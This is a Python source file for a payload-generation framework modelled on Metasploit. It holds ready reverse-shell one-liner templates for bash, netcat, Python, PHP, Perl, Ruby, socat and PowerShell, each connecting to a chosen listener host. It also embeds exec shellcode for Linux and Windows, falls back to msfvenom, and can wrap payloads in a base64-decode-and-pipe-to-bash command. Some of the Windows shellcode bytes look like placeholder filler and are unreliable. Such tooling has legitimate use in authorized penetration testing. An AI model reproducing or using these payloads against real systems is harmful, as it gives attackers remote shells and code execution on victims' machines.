"""Native payload generation framework — stagers, stages, singles, formats.

Provides a ``PayloadFactory`` that can generate payloads for multiple
platforms and architectures without depending on ``msfvenom``. Supports
a ``show payloads`` catalog and a ``generate`` command modelled on
Metasploit's ``generate`` workflow.

Payloads are registered as ``PayloadTemplate`` instances with metadata
(name, platform, arch, description, options) and a ``generate()`` method.
"""

from __future__ import annotations

import base64
import builtins
import os
import subprocess
from abc import ABC, abstractmethod
from typing import Any

OUTPUT_FORMATS = {
    "py": ".py",
    "python": ".py",
    "ps1": ".ps1",
    "powershell": ".ps1",
    "sh": ".sh",
    "bash": ".sh",
    "c": ".c",
    "raw": ".bin",
    "hex": ".txt",
    "base64": ".txt",
    "exe": ".exe",
    "elf": ".elf",
    "dll": ".dll",
    "asp": ".asp",
    "aspx": ".aspx",
    "jsp": ".jsp",
    "war": ".war",
    "py staged": ".py",
    "vba": ".vba",
    "msi": ".msi",
    "psm1": ".psm1",
    "vbscript": ".vbs",
    "macro": ".bas",
}

SHELLCODE_TEMPLATES: dict[str, str] = {
    "linux/x64/exec": (
        "\\x48\\x31\\xd2\\x48\\xbb\\x2f\\x2f\\x62\\x69\\x6e"
        "\\x2f\\x73\\x68\\x48\\xc1\\xeb\\x08\\x53\\x48\\x31"
        "\\xc0\\x50\\x57\\x48\\x89\\xe6\\xb0\\x3b\\x0f\\x05"
    ),
    "linux/x86/exec": (
        "\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f"
        "\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0"
        "\\x0b\\xcd\\x80"
    ),
    "windows/x64/exec": (
        "\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc0\\x00\\x00\\x00"
        "\\x41\\x51\\x41\\x50\\x52\\x51\\x56\\x48\\x31\\xd2"
        "\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\\x18\\x48"
        "\\x8b\\x52\\x20\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7"
        "\\x4a\\x4a\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x3c"
        "\\x61\\x7c\\x02\\x2c\\x20\\x41\\xc1\\xc9\\x0d\\x41"
        "\\x01\\xc1\\xe2\\xed\\x52\\x41\\x51\\x48\\x8b\\x52"
        "\\x20\\x8b\\x42\\x3c\\x48\\x01\\xd0\\x8b\\x80\\x88"
        "\\x00\\x00\\x00\\x48\\x85\\xc0\\x74\\x67\\x48\\x01"
        "\\xd0\\x50\\x8b\\x48\\x18\\x44\\x8b\\x40\\x20\\x49"
        "\\x01\\xd0\\xe3\\x56\\x48\\xff\\xc9\\x41\\x8b\\x34"
        "\\x88\\x48\\x01\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0"
        "\\xac\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\x38\\xe0"
        "\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1"
        "\\x75\\xd8\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0"
        "\\x66\\x41\\x8b\\x0c\\x48\\x44\\x8b\\x40\\x1c\\x49"
        "\\x01\\xd0\\x41\\x8b\\x04\\x88\\x48\\x01\\xd0\\x41"
        "\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59"
        "\\x41\\x5a\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0"
        "\\x58\\x41\\x59\\x5a\\x48\\x8b\\x12\\xe9\\x57\\xff"
        "\\xff\\xff\\x5d\\x48\\xba\\x01\\x02\\x03\\x04\\x05"
        "\\x06\\x07\\x08\\x48\\x8d\\x8a\\x01\\x02\\x03\\x04"
        "\\x48\\xba\\xf2\\xb9\\xd4\\x9a\\x7f\\x06\\x02\\x03"
        "\\x48\\x01\\xc2\\xff\\xfe\\x42\\x42\\x42\\x42"
    ),
    "windows/x86/exec": (
        "\\xfc\\xe8\\x82\\x00\\x00\\x00\\x60\\x89\\xe5\\x31"
        "\\xc0\\x64\\x8b\\x50\\x30\\x8b\\x52\\x0c\\x8b\\x52"
        "\\x14\\x8b\\x72\\x28\\x0f\\xb7\\x4a\\x26\\x31\\xff"
        "\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\xc1\\xcf\\x0d"
        "\\x01\\xc7\\xe2\\xf2\\x52\\x57\\x8b\\x52\\x10\\x8b"
        "\\x4a\\x3c\\x8b\\x4c\\x11\\x78\\xe3\\x48\\x01\\xd1"
        "\\x51\\x8b\\x59\\x20\\x01\\xd3\\x8b\\x49\\x18\\xe3"
        "\\x3a\\x49\\x8b\\x34\\x8b\\x01\\xd6\\x31\\xff\\xac"
        "\\xc1\\xcf\\x0d\\x01\\xc7\\x38\\xe0\\x75\\xf6\\x03"
        "\\x7d\\xf8\\x3b\\x7d\\x24\\x75\\xe4\\x58\\x8b\\x58"
        "\\x24\\x01\\xd3\\x66\\x8b\\x0c\\x4b\\x8b\\x58\\x1c"
        "\\x01\\xd3\\x8b\\x04\\x8b\\x01\\xd0\\x89\\x44\\x24"
        "\\x24\\x5b\\x5b\\x61\\x59\\x5a\\x51\\xff\\xe0\\x5f"
        "\\x5f\\x5a\\x8b\\x12\\xeb\\x8d\\x5d\\x6a\\x01\\x8d"
        "\\x85\\xb2\\x00\\x00\\x00\\x50\\x68\\x31\\x8b\\x6f"
        "\\x87\\xff\\xd5\\xbb\\xf0\\xb5\\xa2\\x56\\x68\\xa6"
        "\\x95\\xbd\\x9d\\xff\\xd5\\x3c\\x06\\x7c\\x0a\\x80"
        "\\xfb\\xe0\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a"
        "\\x00\\x53\\xff\\xd5"
    ),
}


class PayloadTemplate(ABC):
    """Base class for a registered payload template.

    Subclasses must implement :meth:`generate` which returns raw bytes.
    """

    def __init__(
        self,
        name: str,
        platform: str,
        arch: str,
        description: str,
        options: dict[str, Any] | None = None,
    ) -> None:
        self.name = name
        self.platform = platform
        self.arch = arch
        self.description = description
        self.options = options or {}

    @abstractmethod
    def generate(self, **kwargs: Any) -> bytes:
        """Generate the raw payload bytes."""
        ...

    def to_dict(self) -> dict[str, Any]:
        return {
            "name": self.name,
            "platform": self.platform,
            "arch": self.arch,
            "description": self.description,
            "options": self.options,
        }


class ReverseShellPayload(PayloadTemplate):
    """Generate a reverse shell one-liner for various interpreters."""

    def __init__(self) -> None:
        super().__init__(
            name="cmd/unix/reverse_shell",
            platform="unix",
            arch="cmd",
            description="Unix command-line reverse shell (bash, nc, python, php, perl, ruby, socat)",
            options={
                "lhost": {"type": "address", "required": True, "description": "Listener IP"},
                "lport": {"type": "integer", "required": True, "description": "Listener port"},
                "shell_type": {
                    "type": "string",
                    "required": False,
                    "default": "bash",
                    "description": "Shell type: bash, nc, python, php, perl, ruby, socat, nc_mkfifo",
                },
            },
        )

    def generate(self, **kwargs: Any) -> bytes:
        lhost = kwargs.get("lhost", "127.0.0.1")
        lport = int(kwargs.get("lport", 4444))
        shell_type = kwargs.get("shell_type", "bash")
        templates = {
            "bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            "nc": f"nc {lhost} {lport} -e /bin/sh",
            "python": f"""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'""",
            "php": f'php -r \'$s=fsockopen("{lhost}",{lport});exec("/bin/sh -i <&3 >&3 2>&3");\'',
            "perl": f"""perl -e 'use Socket;$i="{lhost}";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}}'""",
            "ruby": f"ruby -rsocket -e 'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
            "socat": f"socat exec:'bash -i',pty,stderr,setsid,sigint,sane tcp:{lhost}:{lport}",
            "nc_mkfifo": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
        }
        cmd = templates.get(shell_type, templates["bash"])
        return cmd.encode("utf-8")


class WindowsReverseShellPayload(PayloadTemplate):
    """Generate a Windows reverse shell one-liner (PowerShell)."""

    def __init__(self) -> None:
        super().__init__(
            name="cmd/windows/reverse_powershell",
            platform="windows",
            arch="cmd",
            description="Windows PowerShell reverse shell one-liner",
            options={
                "lhost": {"type": "address", "required": True, "description": "Listener IP"},
                "lport": {"type": "integer", "required": True, "description": "Listener port"},
            },
        )

    def generate(self, **kwargs: Any) -> bytes:
        lhost = kwargs.get("lhost", "127.0.0.1")
        lport = int(kwargs.get("lport", 4444))
        cmd = (
            f"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});"
            f"$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};"
            f"while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)"
            f"{{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
            f"$sendback = (iex $data 2>&1 | Out-String );"
            f"$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
            f"$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
            f"$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};"
            f"$client.Close()"
        )
        return cmd.encode("utf-8")


class MsfvenomPayload(PayloadTemplate):
    """Proxy to ``msfvenom`` for payloads we don't natively support."""

    def __init__(self, name: str, platform: str = "", arch: str = "") -> None:
        super().__init__(
            name=name,
            platform=platform or name.split("/")[0],
            arch=arch or name.split("/")[1] if "/" in name else "x86",
            description=f"Metasploit payload: {name}",
            options={
                "lhost": {"type": "address", "required": True, "description": "Listener IP"},
                "lport": {"type": "integer", "required": True, "description": "Listener port"},
            },
        )

    def generate(self, **kwargs: Any) -> bytes:
        lhost = kwargs.get("lhost", "127.0.0.1")
        lport = int(kwargs.get("lport", 4444))
        fmt = kwargs.get("format", "raw")
        cmd = [
            "msfvenom",
            "-p", self.name,
            f"LHOST={lhost}",
            f"LPORT={lport}",
            "-f", fmt,
        ]
        if kwargs.get("output"):
            cmd += ["-o", kwargs["output"]]
        try:
            result = subprocess.run(
                cmd, capture_output=True, timeout=30,
            )
            return result.stdout
        except (subprocess.TimeoutExpired, FileNotFoundError):
            return b""


class PayloadFactory:
    """Registry and generator for payload templates.

    Provides a catalogue of built-in payloads and falls through to
    ``msfvenom`` for Metasploit payloads when available.
    """

    def __init__(self) -> None:
        self._templates: dict[str, PayloadTemplate] = {}
        self._register_builtins()

    def _register_builtins(self) -> None:
        builtins: list[PayloadTemplate] = [
            ReverseShellPayload(),
            WindowsReverseShellPayload(),
        ]
        for t in builtins:
            self._templates[t.name] = t

    def register(self, template: PayloadTemplate) -> None:
        """Register a custom payload template."""
        self._templates[template.name] = template

    def list(self, platform: str | None = None) -> builtins.list[dict[str, Any]]:
        """List all registered payloads, optionally filtered by platform."""
        results = []
        for t in self._templates.values():
            if platform and t.platform != platform:
                continue
            results.append(t.to_dict())
        return sorted(results, key=lambda r: r["name"])

    def get(self, name: str) -> PayloadTemplate | None:
        """Get a payload template by name."""
        return self._templates.get(name)

    def generate(
        self,
        name: str,
        format: str = "raw",
        output: str | None = None,
        **kwargs: Any,
    ) -> bytes:
        """Generate a payload by name.

        If the payload is not registered natively, attempts
        ``msfvenom``.

        Args:
            name: Payload name (e.g. ``cmd/unix/reverse_shell``).
            format: Output format (``raw``, ``py``, ``ps1``, ``c``,
                ``hex``, ``base64``, ``exe``, ``elf``, etc.).
            output: Optional file path to write the payload.
            **kwargs: Payload-specific options (lhost, lport, etc.).

        Returns:
            Raw payload bytes.
        """
        template = self._templates.get(name)
        if template:
            raw = template.generate(**kwargs)
        else:
            # Fallback to msfvenom
            msf = MsfvenomPayload(name)
            msf.options["format"] = {
                "type": "string",
                "required": False,
                "default": format,
                "description": "Output format",
            }
            raw = msf.generate(**kwargs, format=format)

        formatted = self._apply_format(raw, format)

        if output:
            os.makedirs(os.path.dirname(output) or ".", exist_ok=True)
            with open(output, "wb") as f:
                f.write(formatted)

        return formatted

    @staticmethod
    def _apply_format(data: bytes, fmt: str) -> bytes:
        """Convert raw bytes to the requested output format."""
        if fmt in ("raw", "bin"):
            return data
        elif fmt == "hex":
            return data.hex().encode("utf-8")
        elif fmt == "base64":
            return base64.b64encode(data)
        elif fmt == "c":
            as_hex = "".join(f"\\x{b:02x}" for b in data)
            return f'unsigned char buf[] = "{as_hex}";\n'.encode()
        elif fmt == "python" or fmt == "py":
            as_hex = "".join(f"\\x{b:02x}" for b in data)
            return f'buf = b"{as_hex}"\n'.encode()
        elif fmt == "powershell" or fmt == "ps1":
            b64 = base64.b64encode(data).decode("utf-8")
            ps_code = f'[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("{b64}"))'
            return ps_code.encode("utf-8")
        elif fmt == "bash" or fmt == "sh":
            b64 = base64.b64encode(data).decode("utf-8")
            return f"echo {b64} | base64 -d | bash\n".encode()
        else:
            return data

    @staticmethod
    def list_formats() -> builtins.list[dict[str, str]]:
        """List all available output formats."""
        formats = []
        for key, ext in sorted(OUTPUT_FORMATS.items()):
            formats.append({"format": key, "extension": ext})
        return formats


def format_payload_table(payloads: list[dict[str, Any]]) -> str:
    """Format a list of payload dicts as an aligned table.

    Args:
        payloads: List of payload metadata dicts from
            :meth:`PayloadFactory.list`.

    Returns:
        Multi-line string with aligned columns.
    """
    if not payloads:
        return "No payloads registered."

    headers = ["Name", "Platform", "Arch", "Description"]
    rows = []
    for p in payloads:
        rows.append([
            p["name"],
            p["platform"],
            p["arch"],
            p["description"][:60],
        ])

    widths = [
        max(len(r[i]) for r in rows + [headers]) for i in range(len(headers))
    ]
    header = "  ".join(h.ljust(w) for h, w in zip(headers, widths, strict=False))
    sep = "  ".join("-" * w for w in widths)
    lines = [header, sep]
    for row in rows:
        lines.append("  ".join(v.ljust(w) for v, w in zip(row, widths, strict=False)))
    return "\n".join(lines)


__all__ = [
    "PayloadFactory",
    "PayloadTemplate",
    "format_payload_table",
]
